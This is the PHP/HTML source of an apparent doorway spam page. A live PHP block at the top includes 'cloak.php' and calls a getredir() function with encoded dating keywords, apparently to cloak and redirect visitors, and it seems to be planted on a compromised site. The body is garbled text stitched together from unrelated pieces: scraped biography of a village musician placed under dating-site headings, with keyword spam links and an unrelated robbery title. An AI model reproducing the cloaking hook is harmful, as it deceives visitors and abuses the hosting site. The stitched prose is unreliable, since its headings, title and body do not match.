<?php
if(!@include('cloak.php'))	@include('../cloak.php');
if(function_exists('getredir')){
	@getredir ('api', '%d0%b7%d0%bd%d0%b0%d0%b9%d0%be%d0%bc%d1%81%d1%82%d0%b2%d0%b0+%d0%b7+%d1%87%d0%be%d0%bb%d0%be%d0%b2%d1%96%d0%ba%d0%be%d0%bc+%d0%b2+%d0%91%d0%be%d1%80%d1%89%d1%96%d0%b2+%d0%a3%d0%ba%d1%80%d0%b0%d1%97%d0%bd%d0%b0', '2021-05-21', 'pir_210521/UA_dat_geo_trans_ukr', 'ua_dating.txt');
}
?><!doctype html>
<html lang="">
<head>
	<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
	<title>Випадкове знайомство обернулося пограбуванням</title>
	<meta name="description" content="Тільки серйозні знайомства Борщів (Тернопільська область) на Дві Зірки, тут у Вас є можливість тут у Вас є можливість познайомитися з красивими​жінками і забезпеченими чоловіками! Україна, Борщів (Тернопільська..." />
	<link rel="canonical" href="https://masage.od.ua/img/103/val-znayomstva-z-cholovkom.php" />
<?php if(!@include('../inc1mywp1.php')) @include('inc1mywp1.php'); ?>
						<div id="primary-menu" class="menu"><ul>
<li class="page_item page-item-2"><a href="https://masage.od.ua/img/103/gam-lesbyanka-pdklyuchiti-poruch.php">лесбіянка підключити поруч Ніжин Україна</a></li><li class="page_item page-item-2"><a href="https://masage.od.ua/img/133/zoh-shvidk-znayomstva-poblizu.php">швидкі знайомства поблизу Городня Україна</a></li><li class="page_item page-item-2"><a href="https://masage.od.ua/img/240/zyxeg-sayti-seksualnih-znayomstv.php">сайти сексуальних знайомств у Стрий Україна</a></li>
</ul></div>
						<div class="main-navigation-bg"></div>
						<div class="clearfix"></div>
					</nav><!-- #site-navigation -->
				</div>
			</div>

		</div>

	</header><!-- #masthead -->



	<div id="content" class="site-content">
	<div class="container"><div class="row"><div class="col-md-7 order-md-3">
	<div id="primary" class="content-area">
		<main id="main" class="site-main main-content-middle">


<article id="post-1" class="post-1 post type-post status-publish format-standard hentry category-uncategorized">
		<header class="entry-header">
		<h1 class="entry-title">Знайомства з чоловіком в Борщів Україна</h1><!-- .entry-meta -->
			</header><!-- .entry-header -->



	<div class="entry-content">

<p>
<p>Фрадкіна на слова Є. Долматовського Відтоді школяр із села став учасником багатьох концертів, що відбувалися в Ічні. Слід згадати, що Жадько порадив хлопцю записатися до духового оркестру, що діяв при сільському Будинку культури. І незабаром літній школяр настільки добре освоїв духовий інструмент, що на 1-й трубі у сольному звучанні виконував «Польку», «Карапета», «Гопака» і навіть мелодії «Вальсів». Талант і старання хлопця настільки високо оцінив капельмейстер оркестру Микола Проха, що запропонував обрати школяра старостою духового оркестру.</p>
<p>І коли у році диригента оркестру призвали до військової служби, керівником оркестру призначили літнього Миколу Борща. Ще підлітком Микола самотужки навчався грати на гармошці.</p>
		
			
				<div>🇺🇦 Люба 34 роки хочу познайомитись з чоловіком для створення сім'ї Україна</div>
				<div><iframe width='560' height='315' src='https://www.youtube.com/embed/j2fnCnYd4K8' frameborder='0' allowfullscreen></iframe></div>
			
		
	<p>Щороку під час шкільних літніх канікул хлопець працював у колгоспі прицепщиком на тракторі, а вечорами у клубі на танцях розважав сільську молодь. Хороші спомини про шкільні роки у серці Миколи залишив тодішній директор Заудайської школи Олександр Іванович Закусило. По-сучасному він був чудовим менеджером-меценатом. Під опікою директора багато років підряд шкільний хор був найкращим на Ічнянщини.</p><strong><a id='g1'></a><h2>Знайомства з дівчатами в Борщеві</h2></strong><p>У ті роки в школі працювала молода вродлива і мудра вчителька іноземної мови Фаїна Семенівна Борщ. Разом з Миколою вона вивчила французькою мовою пісню «Хотят ли русские войни? Коли на районному огляді шкільних колективів сімдесятиголосий хор виконав популярну пісню, а літній соліст Микола Борщ заспівував іноземною мовою, зал вибухнув такими оплесками, що довелося ще двічі співати на прохання публіки. Розчулений директор повів школярів до міської їдальні і за власні гроші пригостив смачним обідом. Цю пісню хор неодноразово виконував і на обласних оглядах в Чернігові.</p>
<p>Білаша на слова М. Сингаївського, Микола відразу її вивчив. У сільському Будинку культури під акомпанемент баяну Тамари Жадько, він уперше виконав пісню і присвятив своїй старенькій мамі. Щирий спів хлопця, хвилюючі слова і лірична музика настільки зворушили односельців, що у багатьох на очах забриніли сльози. Цікаво, що це була перша публікація Т. Жадько, яка згодом закінчила факультет журналістики Київського університету ім.</p>
<p>Шевченка і стала відомим майстром пера. А також перша розповідь в газеті про хлопця із села, який через багато років став відомим хормейстером і диригентом хорового музичного мистецтва. Замітку в газеті прочитала завідуюча районного відділу культури Марія Власівна Пилипенко і запросила хлопця взяти участь у районному концерті, присвяченому міжнародному святу 8-Березня. Тоді Микола уперше зустрівся і познайомився зі своїм однолітком, обдарованим школярем із Ічні Валерієм Буймистром.</p>
<p>Нині Валерій Григорович Буймистер — професор Київської музичної Академії ім. Чайковського, народний артист України, лауреат Національної премії України ім. Цікаво, що майже через півстоліття, на ювілейному концерті Миколи Борща, та на творчому звіті майстрів мистецтв Чернігівської області, Валерій Бурмийстер був солістом пісні обробки Миколи Митрофановича на вірші Л. Глібова «Стоїть гора високая». Ще із молодих років Микола без будь-якої музичної освіти, як самоук до року керував сільським духовим оркестром. Але саме того року батько збудував у селі комору і заробив карбованців.</p>
<p>На ті роки, то були чималі гроші, адже буханець житнього хліба тоді коштував 15 копійок. Митрофан Гордійович вирішив купити сину баян, бо бачив, що хлопець гарно грав на гармошці, і, як у селі говорили, «уже із неї виріс». Щоб знайти хорошого учителя гри на баяні, Микола поїхав до Ічні, де уже діяла дитяча музична школа. Та коли викладачі музшколи побачили мозолисті, зашкарублі руки хлопця, який щороку під час шкільних канікул працював у колгоспі прицепщиком на тракторі, то одноголосно заявили:.</p>
<p>Пізно тобі, хлопче, вчитись на баяні! Подивись на свої пальці — вони у тебе вже неповороткі. Микола звик до того, того, що в селі його поважали, як диригента духового оркестру, та чудового гармоніста.</p><img src="https://12dz.com/sites/default/files/styles/wery-mobi/public/avse_f/ava3/picture-51519-1505245352.jpg?itok=mvC8N92f" alt="Чи треба Україні вступати в НАТО?" style="max-width: 480px; max-height: 480px;"/><p>А така категорична заява була не тільки жорстокою, а й принизливою. І хлопець настілки розгубився, що навіть не попросив принести гармошку, щоб показати, як він майстерно володіє інструментом. А, опустивши голову, пригнічений вийшов із школи. Микола підійшов до гурту і попросив дати дозвіл зіграти на трубі. Витяг із кишені мундштука, якого завжди носив із собою, і легко відтворив мелодію польки «Польки», затим «Карапета», «Гопака», як це робив у селі на танцях.</p><strong><a id='g2'></a><h2>Знайомства Борщів. Безкоштовний сайт знайомств онлайн в Борщеві</h2></strong><p>Дядьки, розкривши роти, захоплено дивилися на хлопця. Тут до них підійшов якийсь чоловік згодом виявилося, що то був директор музичної школи Олексій Сергійович Симончук і запитав Миколу: «Хто ти та звідки? А коли вислухав, сказав: «При нашій музшколі відкривають місчячні курси керівників духових оркестрів.</p>
		
			<br><ul>
			
				<li>Чат у Борщів?</li>
			
				<li>На побаченні з американцем. Блог українки, що живе у США / НВ.</li>
			
				<li>центральна швидкісна дата в Українськ Україна;</li>
			
			</ul>
		
	<p>Якщо хочеш вчитися музичної грамоти та отримати посвідчення про закінчення курсів, то проси свого голову колгоспу, щоб оплатив за твоє навчання». Микола знав, що колгосп «Перебудова» був не із міцних господарств. Але тодішній його очільник Ілля Варлаамович Дуброва дуже цінував хлопця за музичний талант і виділив немалі гроші, щоб направити обдарованого односельця на курси.</p>
<p>Удень Микола навчався на курсах у педагога Едуарда Сидоровича Хоменка, а вечорами ходив до десятого класу Ічнянської вечірньої школи робітничої молоді. Як уже згадувалося, хлопець не мав ніякої музичної освіти. І як мені розповідав, що перші кроки до музичної самоосвіти зробив, коли ще не ходив до школи: спочатку грав на саморобних свистках, зроблених з липової та вербової кори. А коли трохи підріс, вигравав на саморобних сурмах із вільхової та липової кори. І лише згодом навчався грати на трубі та самотужки оволодів гармошкою. Навчаючись на курсах керівників духового оркестру, хлопець із глибинки дізнався, що окрім гри на різних музичних інструментах існує ще і музична грамота, теорія музики і сольфеджіо.</p><a id='g3'></a><h3>Статті по темі</h3><p>Цікаво, але факт, що у свої сімнадцять років Микола Борщ у музичній школі уперше побачив фортепіано. Вдома, в селі, вирізав із дошки модель клавіатури фортепіано, а клавіші розфарбував у чорні та білі кольори. Таким чином на цій моделі щоденно тренувався і розробляв свій внутрішній музичний слух, як говорять педагоги, шліфував його до абсолютного. Слід сказати, що через років це заняття дуже пригодилося Миколі, при написанні музичних диктантів, коли він був студентом музичного училища, а згодом консерваторії.</p>
<p>Навчаючись на курсах, хлопець у ті роки навіть гадки не мав, що колись буде студентом музичного училища, і такого престижного вишу - консерваторії. Його батьки хотіли, щоб найменший син заробляв на хліб, як і його ровесники «по-людськи», тобто або шофером на машині, чи механізатором на тракторі. А ще краще — на зерновому комбайні, адже там гарно платили. А гра на трубі чи баяні — це не робота, а лише розвага для душі і баловство.</p>
		
	<p>По закінченню курсів керівників духових оркестрів хлопець вирішив вступити до Чернігівського музичного училища. Але виявилося, що він вчився за колгоспні кошти, і треба відпрацювати у рідному селі диригентом духового оркестру. Та коли дізнався, що можна навчатися заочно, то вступив до класу духових інструментів. Викладачі музичного училища М. Козак та В. Недашківський помітили обдарованого студента-заочника і підказали директору училища заслуженому працівнику культури України Василю Івановичу Полєвику, що у хлопця абсолютний слух і гуртом умовили Миколу перевестися на диригентсько-хорове відділення.</p>
<p>Микола радів, що життя його щасливо склалося. Він працював капельмейстером духового оркестру у рідному селі і заочно навчався в училищі. Та не так сталося, як хотілося. У році Миколу призвали до військової служби. Але йому не пощастило, що він не потрапив до музичного взводу. А служив у танкових військах, що дислокувалися на території Демократичної Республіки Німеччини. Миколі тоді будо 22 роки, а в групі з ним навчалися літні студенти, які після 8- го класу вступили до училища.</p>
<p>У їхній групі було троє хлопців, які також щойно повернулися із армії. Вони старанно навчалися і солідною поведінкою помітно виділялися серед студентського галасливого загалу.</p>
		
	<p>Вчорашні школярі з повагою дивилися на студентів старшого віку і навіть намагалися в чомусь їх наслідувати. У музичному училищі навчалося багато дівчат. І Миколі дуже подобалася білявка з великими голубими, мов озера, очима — другокурсниця-бандуристка Раїса Півень.</p>
<p>Дівчина приїхала з віддаленого села Атюши Коропського району Чернігівщини. Вона була найменшою шостою дитиною. Батьки навчили Раю головного в житті — працювати та із раннього життя виконувати будь-яку домашню роботу. Дівчина вступила до училища, не маючи початкової музичної освіти. Адже музичної школи у їхньому селі не було. Але перші кроки до початкової музичної освіти вона одержала від своїх батьків. Микола Павлович гарно співав і чудово грав на мандоліні, а у Ніни Михайлівни було ніжне і приємне сопрано. А ще вона мала хист режисера, і була керівником драматичного колективу, що діяв при сільському Будинку культури.</p>
<p>Вище уже згадувалося, що за радянських часів у багатьох селах закривали церкви і переобладнували під клуби. Шевченка, «Доки сонце зійде, роса очі виїсть» - М. Кропивницького, «Сватання на Гончарівці» та «Шельменко-денщик» - Г. Із раннього дитинства відбулося знайомство дівчини із кращими зразками вітчизняної драматургії.</p>
<p>Отже, подружжя Півнів було відоме далеко за межами Коропщини. Вразлива душа Раї з животрепетною допитливістю всотувала надбання духовних батьків української драматургії. Можливо, саме тоді священна любов до прекрасного, до великого мистецтва, зачепило творчу струну в душі сільської дівчини, що вона усім серцем, усіма фібрами душі назавжди полюбила національний інструмент бандуру.</p>
</p>
	</div><!-- .entry-content -->

</article><!-- #post-1 -->


		</main><!-- #main -->
	</div><!-- #primary -->


	</div><div class="col-md-2 order-md-1">

	<aside id="secondary" class="widget-area">
			</aside><!-- #secondary -->
</div><div class="col-md-3 order-md-10">
	<aside id="secondary" class="widget-area">
		<section id="search-2" class="widget widget_search"><form role="search" method="get" class="search-form" action="https://masage.od.ua/img/457/qamyv-sayti-znayomstv-dlya.php">
				<label>
					<span class="screen-reader-text">Search for:</span>
					<input type="search" class="search-field" placeholder="Search &hellip;" value="" name="s" />
				</label>
				<input type="submit" class="search-submit" value="Search" />
			</form></section>		<section id="recent-posts-2" class="widget widget_recent_entries">		<h2 class="widget-title">Recent Posts</h2>		<ul>
											<li><a href="https://masage.od.ua/img/248/nymi-osobista-sluzhba.php">особиста служба сватів поблизу Синельникове Україна</a></li><li><a href="https://masage.od.ua/img/113/nav-hristiyanskiy-sayt-znayomstv.php">християнський сайт знайомств в Знамянка Україна</a></li><li><a href="https://masage.od.ua/img/377/hafi-povniy-gachok.php">повний гачок Городня Україна</a></li><li><a href="https://masage.od.ua/img/247/xyv-oblast-shvidksnih.php">область швидкісних знайомств Ватутіне Україна</a></li><li><a href="https://masage.od.ua/img/113/hagu-starsh-znayomstva.php">старші знайомства Вознесенівка Україна</a></li><li><a href="https://masage.od.ua/img/133/lymax-znayomstva-z-deyami.php">знайомства з ідеями в Енергодар Україна</a></li><li><a href="https://masage.od.ua/img/184/cyp-azatska-sluzhba.php">азіатська служба знайомств Бершадь Україна</a></li>
					</ul>
		</section>

			<section id="meta-2" class="widget widget_meta"><h2 class="widget-title">Articles</h2>
				<ol><li><a href='#g1'>Знайомства з дівчатами в Борщеві</a></li>
<li><a href='#g2'>Знайомства Борщів. Безкоштовний сайт знайомств онлайн в Борщеві</a></li>
<li><a href='#g3'>Статті по темі</a></li>
</ol>
			</section>

	</aside><!-- #secondary -->
</div></div></div>	</div>
	<footer id="colophon" class="site-footer">

		<div class="covf-footer-copyright">
			<div class="container">
				<div class="row">
					<div class="col">
						<div class="site-info text-center">
							Powered by 	<a href="https://masage.od.ua/img/248/xotax-talysk-znayomstva-yuzhnoukransk.php">Covfefe WordPress Theme</a>
						</div>
					</div>
				</div>
			</div>
		</div>
	</footer><!-- #colophon -->
</div><!-- #page -->

<script type='text/javascript' src='https://masage.od.ua/img/wp-content/themes/covfefe.1.0.2/covfefe/js/jquery.marquee.js?ver=20151215'></script>
<script type='text/javascript' src='https://masage.od.ua/img/wp-content/themes/covfefe.1.0.2/covfefe/js/scripts.js?ver=20151215'></script>
<script type='text/javascript' src='https://masage.od.ua/img/wp-includes/js/comment-reply.min.js?ver=5.0.3'></script>
<script type='text/javascript' src='https://masage.od.ua/img/wp-includes/js/wp-embed.min.js?ver=5.0.3'></script>

</body>
</html>